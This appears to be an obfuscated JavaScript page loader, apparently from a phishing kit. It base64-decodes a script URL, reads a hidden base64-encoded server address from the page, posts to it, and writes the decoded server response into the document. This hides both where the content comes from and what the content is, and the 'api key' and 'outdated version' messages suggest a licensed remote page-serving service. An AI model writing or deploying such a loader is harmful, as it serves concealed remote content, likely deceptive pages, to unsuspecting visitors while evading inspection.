var scr= document.createElement('script');
var stc ="aHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMS4xLm1pbi5qcw=="
scr.setAttribute('src',atob(stc));
document.head.append(scr);
scr.onload=function(){
$.support.cors = true
var url = atob($('#b64u').val());
$.post(url,'scte='.concat(''))
	.done(function(data){
     if(data=='no'){
	   document.write('<h1>Please Get an api key to use this page</h1>')
	 }
	 else if(data == "outdated"){
		 document.write('<h1>Please get an updated  version of the page</h1>')
	 }
	 else{
		 try{
			 document.write(atob(data));
		 }catch(e){
			 document.write('<h1>Cannot write to page</h1>')
		 }
	 }
	})
	.fail(function(cd,pg){
		document.write("<h1>Unable to connect , Server not found</h1>")
	})
}